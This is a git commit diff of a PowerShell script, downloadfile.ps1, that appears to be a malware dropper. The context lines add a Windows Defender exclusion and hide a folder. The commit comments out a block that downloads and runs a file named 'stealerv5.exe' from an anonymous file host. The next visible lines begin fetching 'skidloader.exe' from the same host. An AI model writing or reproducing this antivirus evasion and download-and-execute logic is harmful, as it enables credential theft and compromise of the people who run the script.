cdf1f333be38cc0e8f4c5c16a0307b028af98a1c
43a1723 <hai1723notgay@gmail.com>
2025-04-01 21:00:09 +0700

    Update downloadfile.ps1

--- s/downloadfile.ps1
+++ s/downloadfile.ps1
@@ -5,21 +5,21 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 $folderPath = $dir
-$filePath = "$folderPath\stealerv5.exe"
-$url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
+# $filePath = "$folderPath\stealerv5.exe"
+# $url = "https://anonsharing.com/file/7e713a235817c63a/sigma_999.exe"
 
 # Tạo thư mục nếu chưa tồn tại
-if (!(Test-Path $folderPath)) {
-    New-Item -ItemType Directory -Path $folderPath -Force
-}
+# if (!(Test-Path $folderPath)) {
+#     New-Item -ItemType Directory -Path $folderPath -Force
+# }
 
 # Kiểm tra nếu file chưa tồn tại thì tải về
-if (!(Test-Path $filePath)) {
-    Invoke-WebRequest -Uri $url -OutFile $filePath
-}
+# if (!(Test-Path $filePath)) {
+#     Invoke-WebRequest -Uri $url -OutFile $filePath
+# }
 
 # Chạy file thực thi
-Start-Process -FilePath $filePath -NoNewWindow
+# Start-Process -FilePath $filePath -NoNewWindow
 
 $filePath = "$folderPath\loader.exe"
 $url = "https://anonsharing.com/file/34157158f6d1f6e2/skidloader.exe"
